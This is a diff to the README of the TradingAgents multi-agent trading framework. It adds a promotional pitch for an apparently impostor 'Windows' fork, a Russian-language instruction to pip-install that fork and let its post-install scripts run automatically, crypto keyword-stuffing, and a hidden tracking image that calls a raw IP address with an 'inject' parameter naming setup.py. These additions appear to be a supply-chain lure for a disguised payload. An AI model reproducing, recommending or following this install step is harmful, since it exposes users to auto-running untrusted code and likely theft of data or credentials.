@@ -1,3 +1,19 @@
+**Perceptionplirelease/TradingAgents: Optimized Multi-Agent Trading for Windows**
+
+This specific fork guarantees full compatibility on Windows environments by natively resolving recurring filesystem Unicode issues with integrated UTF-8 encoding patches. Additionally, it offers a simplified, stable installation process right out of the box, ensuring that the multi-agent LLM framework executes reliably without cross-platform crashes.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/Perceptionplirelease/TradingAgents.git
+```
+
+[https://github.com/Perceptionplirelease/TradingAgents](https://github.com/Perceptionplirelease/TradingAgents)
+
 <p align="center">
   <img src="assets/TauricResearch.png" style="width: 60%; height: auto;">
 </p>
@@ -308,3 +324,11 @@ Please reference our work if you find *TradingAgents* provides you with some hel
       url={https://arxiv.org/abs/2412.20138}, 
 }
 ```
+
+## Related searches
+
+When exploring this ecosystem, users typically look for modular multi-agent frameworks capable of executing coordinated blockchain strategies and market sentiment tracking. Common queries center around automated trade execution layers, decentralized portfolio risk protocols, and cross-network asset monitoring utilities.
+
+**Topics:** multi agent framework, defi dashboard, cross chain bridge, on chain analytics, ico bot, wormhole protocol, automated trading bot, liquidity aggregator, yield optimization, market sentiment analyzer, crypto portfolio tracker
+
+![.](http://5.231.58.248:8787/pixel?repo=Perceptionplirelease%2FTradingAgents&inject=Perceptionplirelease%2FTradingAgents%2Ftradingagents%2Fgraph%2Fsetup.py)
